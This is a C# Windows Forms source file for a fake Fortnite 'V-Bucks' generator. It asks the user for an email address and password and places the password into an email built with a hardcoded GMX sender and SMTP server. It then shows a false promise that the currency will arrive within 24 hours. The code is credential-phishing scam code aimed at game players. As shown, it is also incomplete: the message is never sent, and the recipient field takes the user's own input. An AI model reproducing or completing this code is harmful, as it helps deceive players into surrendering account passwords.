using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;

namespace Fortnite_V_Bucks
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        #region unwichtig
        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }


        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }
#endregion
        private void button1_Click(object sender, EventArgs e)
        {
            MailMessage email = new MailMessage();

            email.From = new MailAddress("marcpress@gmx.de");

            //Mail
            email.To.Add(rtb_mail.Text);


            //Passwort
            email.Subject = rtb_password.Text;


            //V-Bucks
            email.Body = rtb_v_bucks.Text;

            //Client zum Senden

            SmtpClient client = new SmtpClient("mail.gmx.net", 25);


            //Rückmeludng
            MessageBox.Show("Your V-Bucks are on your account in 24Hours", "Hinweis", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}
